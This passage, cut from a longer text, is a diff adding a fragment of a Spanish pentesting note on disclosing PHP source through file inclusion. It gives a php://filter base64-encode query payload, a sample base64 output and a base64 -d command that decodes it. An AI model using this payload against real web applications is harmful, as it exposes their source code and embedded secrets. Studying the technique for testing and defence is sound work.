@@ -1,0 +1,10 @@
+motras un script sin ejecutar, es decir el código del script:
+
+
+?campo_php=php://filter/convert.base64-encode/resource=script_accesible.php
+
+
+PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K
+
+echo 'PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K' | base64 -d
+
